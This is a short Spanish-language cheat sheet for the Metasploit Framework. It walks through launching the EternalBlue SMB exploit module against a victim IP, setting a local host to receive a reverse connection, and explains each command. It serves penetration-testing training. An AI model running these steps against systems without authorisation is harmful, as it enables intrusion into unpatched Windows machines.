# 💣 Manual de Uso: Metasploit Framework

> La plataforma de pruebas de penetración más utilizada del mundo.

### 💻 Flujo de Trabajo (Ejemplo Real)

```bash
# 1. Iniciar la consola
msfconsole

# 2. Buscar un exploit (ej: eternalblue)
msf6 > search eternalblue

# 3. Seleccionar el módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. Ver qué requisitos pide el exploit
msf6 > show options

# 5. Configurar el objetivo (Víctima) y atacante (Tú)
msf6 > set RHOSTS 192.168.1.50
msf6 > set LHOST 192.168.1.10

# 6. Ejecutar el ataque
msf6 > exploit


msfconsole : Inicia la interfaz principal de línea de comandos.

search [nombre] : Busca exploits, auxiliares o módulos por palabras clave.

use [ruta] : Selecciona y carga un módulo específico para usarlo.

show options : Muestra la tabla de configuración necesaria (puertos, IPs, etc.).

set RHOSTS [IP] : Configura la IP del Remote Host (la Víctima).

set LHOST [IP] : Configura la IP del Local Host (Tú) para recibir la conexión inversa.

exploit : Lanza el ataque (usado principalmente en exploits).

run : Sinónimo de exploit, usado comúnmente en módulos auxiliary (escáneres).
